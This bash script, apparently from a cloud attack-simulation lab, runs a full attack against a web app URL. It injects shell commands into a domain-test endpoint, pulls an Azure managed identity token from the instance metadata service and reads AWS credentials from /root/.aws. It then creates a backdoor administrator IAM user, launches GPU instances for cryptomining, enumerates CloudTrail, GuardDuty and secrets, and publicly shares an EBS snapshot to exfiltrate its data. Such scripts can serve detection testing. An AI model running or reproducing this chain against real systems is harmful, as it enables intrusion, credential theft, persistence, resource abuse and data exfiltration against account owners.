#!/bin/bash

if [[ $# != 1 ]]; then
  echo "Usage: run-attack.sh app-url" >&2
  exit 1
fi

function request() {
  echo "Requesting $1"
  curl --max-time 10 -s $url/test-domain -H "Content-Type: application/json" -X POST -d "{\"domainName\":\"$1\"}"
  echo
}
function randomSleep() {
  sleep $((RANDOM % 4))
}

url=$1
echo "Attacking $url"

echo "Performing recon"
request "google.com"
randomSleep

request "aaaaa"
randomSleep

request '$(whoami)'
randomSleep

request '\`whoami\`'
randomSleep

request '127.0.0.1'
randomSleep

request '127.0.0.1 && whoami'
randomSleep

request '127.0.0.1 && cat /etc/os-release'
randomSleep

# Azure stuff
azureCreds=$(request "127.0.0.1 && curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com' -H Metadata:true -s")
echo $azureCreds
export AZURE_TOKEN=$(echo "$azureCreds" | grep -oE '\{"access_token":.+}' | jq -r '.access_token' )
echo "Retrieved Azure managed identity token: $AZURE_TOKEN"
randomSleep
sasUrl=$(python3 share-disk.py $ARM_SUBSCRIPTION_ID rg-backups backups_v0)
if [[ $? -eq 0 ]]; then
  echo "Successfuly retrieved SAS URL: $sasUrl"
fi

randomSleep
randomSleep

request '127.0.0.1 && ls -l /root'
randomSleep

request '127.0.0.1 && ls -l /root/.aws'
randomSleep

creds=$(request '127.0.0.1 && cat /root/.aws/credentials')
export AWS_ACCESS_KEY_ID=$(echo "$creds" | grep aws_access_key_id | cut -d= -f2)
export AWS_SECRET_ACCESS_KEY=$(echo "$creds" | grep aws_secret | cut -d= -f2)
aws sts get-caller-identity
randomSleep

# Create an IAM user for persistence
aws iam create-user --user-name support
aws iam attach-user-policy --user-name support --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name support

# Spin up a bunch of instances
randomSleep
echo "Attempting to spin up GPU instances"
AMI_ID=$(aws ssm get-parameters-by-path --path /aws/service/ami-amazon-linux-latest --query "Parameters[].Name")
# g4ad.xlarge seems to be a popular choice for mining cryptocurrency
# c.f. https://medium.com/coinmonks/new-aws-instance-that-makes-eth-mining-profitable-1dd87183cce7
aws ec2 run-instances \
    --image-id resolve:ssm:/aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-ebs \
    --instance-type g4ad.xlarge \
    --count 5

# That didn't work? What else can we do in the account...
echo "Enumerating resources"
aws ec2 describe-instances >/dev/null
aws cloudtrail list-trails >/dev/null
aws guardduty list-detectors >/dev/null
randomSleep
aws s3 ls >/dev/null
aws iam list-account-aliases >/dev/null
aws iam get-account-summary >/dev/null
aws iam get-account-authorization-details >/dev/null
aws rds describe-db-clusters >/dev/null
aws rds describe-db-instances >/dev/null
aws secretsmanager list-secrets >/dev/null
aws ssm get-parameters-by-path --path / --recursive >/dev/null
randomSleep

echo "Listing EBS volumes and finding a juicy one"
VOLUME_ID=$(aws ec2 describe-volumes | jq -r '.Volumes[] | select(.Size == 1) | .VolumeId')

echo "Taking snapshot of $VOLUME_ID"
SNAPSHOT_ID=$(aws ec2 create-snapshot --volume-id $VOLUME_ID | jq -r .SnapshotId)

echo "Waiting for snapshot"
aws ec2 wait snapshot-completed --filters Name=snapshot-id,Values=$SNAPSHOT_ID

echo "Sharing snapshot publicly"
randomSleep
aws ec2 modify-snapshot-attribute --snapshot-id $SNAPSHOT_ID --attribute createVolumePermission --operation-type add --group-names all
